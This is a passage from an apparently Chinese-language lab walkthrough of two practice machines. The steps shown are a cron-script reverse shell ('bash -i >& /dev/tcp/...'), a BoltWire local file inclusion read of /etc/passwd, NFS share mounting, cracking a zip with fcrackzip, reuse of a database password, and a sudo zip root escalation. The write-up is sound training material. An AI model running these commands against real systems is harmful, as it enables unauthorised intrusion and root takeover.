PID=30273  | /bin/bash /home/grimmie/backup.sh**</span><br></pre></td></tr></table></figure>
</li>
<li><p>進行提權，前面結果看到利用&#x2F;bin&#x2F;bash 去執行了 backup.sh，我們可以修改sh檔案進行利用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li>Bash</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<ul>
<li><p>kali(attacker vm) → <code>nc -nlvp 8081</code></p>
</li>
<li><p>grimmie →</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano backup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl + k清除該行文字</span></span><br><span class="line"><span class="comment">#填入</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.19.130/8081 0&gt;&amp;1 <span class="comment">#提升權限到root</span></span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="http://等待排程執行到backup.sh/">等待排程執行到backup.sh</a>，就成功執行該提權指令</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8081**</span><br><span class="line">listening on [any] 8081 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 49870</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (30439): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@academy:~# **<span class="built_in">whoami</span>**</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@academy:~# <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">**flag.txt**</span><br><span class="line">root@academy:~# **<span class="built_in">cat</span> flag.txt**</span><br><span class="line">Congratz you rooted this box !</span><br><span class="line">Looks like this CMS isn<span class="string">&#x27;t so secure...</span></span><br><span class="line"><span class="string">I hope you enjoyed it.</span></span><br><span class="line"><span class="string">If you had any issue please let us know in the course discord.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Happy hacking !</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Walkthrough-Dev"><a href="#Walkthrough-Dev" class="headerlink" title="Walkthrough - Dev"></a><strong>Walkthrough - Dev</strong></h3><ul>
<li>192.168.19.142</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.142**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 15:47 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.142</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 bd:96:ec:08:2f:b1:ea:06:ca:<span class="built_in">fc</span>:46:8a:7e:8a:e3:55 (RSA)</span><br><span class="line">|   256 56:32:3b:9f:48:2d:e0:7e:1b:<span class="built_in">df</span>:20:f8:03:60:56:5e (ECDSA)</span><br><span class="line">|_  256 95:<span class="built_in">dd</span>:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">**|_http-title: Bolt - Installation error</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)**</span><br><span class="line">111/tcp   open  rpcbind  2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      41323/tcp   mountd</span><br><span class="line">|   100005  1,2,3      49494/udp6  mountd</span><br><span class="line">|   100005  1,2,3      51274/udp   mountd</span><br><span class="line">|   100005  1,2,3      55743/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      37638/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      43669/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      43833/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      60309/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">2049/tcp  open  **nfs**      3-4 (RPC <span class="comment">#100003)</span></span><br><span class="line">8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()</span><br><span class="line">36403/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">41323/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43609/tcp open  mountd   1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">43833/tcp open  nlockmgr 1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">MAC Address: 00:0C:29:BE:3A:C6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.59 seconds</span><br></pre></td></tr></table></figure>

<p>開啟網頁查看</p>
<ul>
<li><p>目前有兩個網頁</p>
<ul>
<li>8080&#x2F;tcp  open  http     Apache httpd 2.4.38 ((Debian))</li>
<li>80&#x2F;tcp    open  http     Apache httpd 2.4.38 ((Debian))</li>
</ul>
<p>  <img src="/img/privilege_Untitled_13.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_14.png" alt="Untitled">
  </p>
</li>
<li><p>php 資訊頁面</p>
<ul>
<li>洩漏資訊</li>
<li>頁面設定</li>
<li>information disclosure</li>
<li>跟伺服器有關的訊息</li>
<li>錯誤配置可能導致能進行漏洞利用</li>
</ul>
</li>
<li><p>尋找可能存在的網頁目錄位置</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 2ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1ms]</span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 4ms]</span></span><br><span class="line">public                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2ms]</span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 218ms]</span></span><br><span class="line">src                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">app                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 511ms]</span></span><br><span class="line">vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line">extensions              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]</span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 818ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 824ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 866ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 880ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1146ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1153ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1178ms]</span></span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1406ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1710ms]</span></span><br><span class="line">                        [Status: 200, Size: 3833, Words: 926, Lines: 108, Duration: 1866ms]</span><br><span class="line">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 796 req/sec :: Duration: [0:00:52] :: Errors: 0 ::**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.142:8080/FUZZ</span><br><span class="line"></span><br><span class="line"><span class="comment"># on atleast 2 different hosts [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 18ms]</span></span><br><span class="line"><span class="comment"># This work is licensed under the Creative Commons  [Status: 200, Size: 94539, Words: 4684, Lines: 1159, Duration: 75ms]</span></span><br><span class="line"><span class="comment"># Copyright 2007 James Fisher [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 143ms]</span></span><br><span class="line"><span class="comment"># directory-list-2.3-medium.txt [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 180ms]</span></span><br><span class="line"><span class="comment"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 428ms]</span></span><br><span class="line">dev                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 3ms]</span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 490ms]</span><br><span class="line"><span class="comment"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 671ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 686ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 704ms]</span></span><br><span class="line"><span class="comment"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 708ms]</span></span><br><span class="line"><span class="comment"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 699ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 713ms]</span></span><br><span class="line"><span class="comment">#                       [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 712ms]</span></span><br><span class="line"><span class="comment"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 731ms]</span></span><br><span class="line">                        [Status: 200, Size: 94540, Words: 4684, Lines: 1159, Duration: 11ms]</span><br><span class="line">server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4ms]</span><br><span class="line">:: Progress: [220560/220560] :: Job [1/1] :: 6896 req/sec :: Duration: [0:00:51] :: Errors: 0 ::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看 80 port</p>
<ul>
<li>pubilc &gt; 404 not founud</li>
<li>src &gt; Site &gt;  CustomisationExtension.php &gt; nothing here</li>
</ul>
<p>  <img src="/img/privilege_Untitled_15.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>app &gt;<ul>
<li>cache &gt;<ul>
<li><p>config-cache.json</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;database&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;driver&quot;</span>: <span class="string">&quot;pdo_sqlite&quot;</span>,</span><br><span class="line">            <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">            <span class="string">&quot;slaves&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;bolt_&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>: <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;collate&quot;</span>: <span class="string">&quot;utf8_unicode_ci&quot;</span>,</span><br><span class="line">            <span class="string">&quot;randomfunction&quot;</span>: <span class="string">&quot;RANDOM()&quot;</span>,</span><br><span class="line">            **<span class="string">&quot;databasename&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;I_love_java&quot;</span>,</span><br><span class="line">            <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bolt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;wrapperClass&quot;</span>: <span class="string">&quot;Bolt\\Storage\\Database\\Connection&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/var/www/html/app/database/bolt.db&quot;</span>**</span><br></pre></td></tr></table></figure>
</li>
<li><p>development&#x2F;</p>
</li>
<li><p>exception&#x2F;</p>
</li>
<li><p>profiler&#x2F;</p>
</li>
<li><p>trans&#x2F;</p>
</li>
</ul>
</li>
<li>config &gt;<ul>
<li><p>config.yml</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">database:</span><br><span class="line">driver: sqlite</span><br><span class="line">databasename: bolt</span><br><span class="line">username: bolt</span><br><span class="line">password: I_love_java</span><br></pre></td></tr></table></figure>
</li>
<li><p>contenttypes.yml</p>
</li>
<li><p>extensions&#x2F;</p>
</li>
<li><p>menu.yml</p>
</li>
<li><p>permissions.yml</p>
</li>
<li><p>routing.yml</p>
</li>
<li><p>taxonomy.yml</p>
</li>
</ul>
</li>
<li>database &gt;bolt.db</li>
<li>unt &gt; loaded on a very old version of PHP</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_17.png" alt="Untitled"></p>
<ul>
<li><p>查看8080 port</p>
<ul>
<li><p>dev &gt; boltwire setup successfully</p>
<ul>
<li>register</li>
</ul>
<p>  <img src="/img/privilege_Untitled_18.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_19.png" alt="Untitled"></p>
<ul>
<li><p>查找BoltWire相關漏洞</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48411">https://www.exploit-db.com/exploits/48411</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Cyber-Wo0dy/CVE-2023-46501">https://github.com/Cyber-Wo0dy/CVE-2023-46501</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit boltwire**</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                 |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">BoltWire 3.4.16 - <span class="string">&#x27;index.php&#x27;</span> Multiple Cross-Site Scripting Vulnerabilities                                    | php/webapps/36552.txt</span><br><span class="line">BoltWire 6.03 - **Local File Inclusion**                                                                           | php/webapps/48411.txt</span><br><span class="line">--------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<ul>
<li>Cross-Site Scripting Vulnerabilities 對於這次攻擊目標的危害不大</li>
<li>除非有人模仿用戶進入並實際瀏覽網站</li>
<li>目前沒有要進行攻擊用戶的行為</li>
<li>關注Local File Inclusion 並利用這個漏洞去訪問一些機敏文件</li>
<li>修改&#x2F;index.php後的路徑<ul>
<li>必須是註冊後且登入用戶才可利用</li>
</ul>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_20.png" alt="Untitled"></p>
<ul>
<li>成功利用漏洞，可以嘗試換成查看&#x2F;etc&#x2F;shadow，也許可以看到passwd hash，但該頁面再這邊沒有任何內容</li>
</ul>
<p>  <img src="/img/privilege_Untitled_21.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">**jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash**</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin</span><br><span class="line">statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>看起來這邊只有一個用戶<strong>jeanpaul，嘗試用ssh登入</strong></p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142** </span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: </span><br><span class="line">jeanpaul@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>
<ul>
<li>這邊可以嘗試 brute forcing key id_rsa，如果是弱密碼就有機會爆破出</li>
<li>也可以嘗試之前找到的db資料 &gt; password: I_love_java 試試</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jeanpaul@192.168.19.142**</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>: **I_love_java** </span><br><span class="line">Linux dev 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">ls</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/jeanpaul</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">history</span> </span><br><span class="line">    1  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; .bash_history </span><br><span class="line">    2  <span class="built_in">sudo</span> -l</span><br><span class="line">    3  <span class="built_in">exit</span></span><br><span class="line">    4  <span class="built_in">ls</span></span><br><span class="line">    5  <span class="built_in">pwd</span></span><br><span class="line">    6  <span class="built_in">history</span></span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jeanpaul on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jeanpaul may run the following commands on dev:</span><br><span class="line">    **(root) NOPASSWD: /usr/bin/zip**</span><br></pre></td></tr></table></figure>
<ul>
<li><p>用sudo zip去進行權限提升，在有限的root權限指令下進行提權</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li>進入網頁點選 sudo&gt;找到zip&gt;</li>
</ul>
<p>  <img src="/img/privilege_Untitled_22.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**jeanpaul@dev:~$ TF=$(<span class="built_in">mktemp</span> -u)</span><br><span class="line">jeanpaul@dev:~$ <span class="built_in">sudo</span> zip <span class="variable">$TF</span> /etc/hosts -T -TT <span class="string">&#x27;sh #&#x27;</span>**</span><br><span class="line">  adding: etc/hosts (deflated 31%)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># sudo -l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> root on dev:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User root may run the following commands on dev:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"><span class="comment"># cd /root      </span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line">Congratz on rooting this box !</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>nfs &gt;</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://kalitut.com/mount-nfs-share/">https://kalitut.com/mount-nfs-share/</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting">https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting</a></li>
</ul>
</li>
<li><p>查詢目標機器上的NFS(Network File System)共享的輸出結果</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **showmount -e** 192.168.19.142</span><br><span class="line">Export list <span class="keyword">for</span> 192.168.19.142:</span><br><span class="line">/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16</span><br><span class="line"><span class="comment">#這台主機上的NFS共享目錄為/srv/nfs</span></span><br></pre></td></tr></table></figure>

<p>此共享目錄允許以下範圍的IP地址進行訪問：</p>
<ul>
<li>172.16.0.0&#x2F;12：表示172.16.0.0至172.31.255.255的IP範圍。</li>
<li>10.0.0.0&#x2F;8：表示10.0.0.0至10.255.255.255的IP範圍。</li>
<li>192.168.0.0&#x2F;16：表示192.168.0.0至192.168.255.255的IP範圍。</li>
</ul>
<p>換句話說，這個NFS共享只允許來自這些IP範圍的主機訪問。</p>
<p>成功將目標機器上&#x2F;srv&#x2F;nfs共享目錄掛載到了本地(攻擊者)系統上，並且可以在&#x2F;mnt&#x2F;dev目錄中訪問該共享目錄中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">mkdir</span> /mnt/dev</span><br><span class="line">                                                                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# mount -t nfs 192.168.19.142:/srv/nfs /mnt/dev</span><br><span class="line"><span class="comment">#從192.168.19.142主機掛載了一個NFS共享目錄到本地系統的/mnt/dev目錄</span></span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cd</span> /mnt/dev          </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# <span class="built_in">ls</span>                </span><br><span class="line">save.zip</span><br><span class="line"><span class="comment">#進入了/mnt/dev目錄並列出了其中的文件，發現有一個名為save.zip的文件。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>找到文件後嘗試解壓縮發現需要密碼但目前沒有</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# unzip save.zip </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">   skipping: id_rsa                  incorrect password</span><br><span class="line">   skipping: todo.txt                incorrect password</span><br></pre></td></tr></table></figure>

<ul>
<li>嘗試破解ZIP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# apt install fcrackzip       </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  fcrackzip</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip </span><br><span class="line">found file <span class="string">&#x27;id_rsa&#x27;</span>, (size <span class="built_in">cp</span>/uc   1435/  1876, flags 9, chk 2a0d)</span><br><span class="line">found file <span class="string">&#x27;todo.txt&#x27;</span>, (size <span class="built_in">cp</span>/uc    138/   164, flags 9, chk 2aa1)</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == java101</span><br><span class="line"></span><br><span class="line"><span class="comment"># -v 詳細模式（Verbose mode）提供額外的細節</span></span><br><span class="line"><span class="comment"># -u 破解zip檔案</span></span><br><span class="line"><span class="comment"># -D using a dictionary attack</span></span><br><span class="line"><span class="comment"># 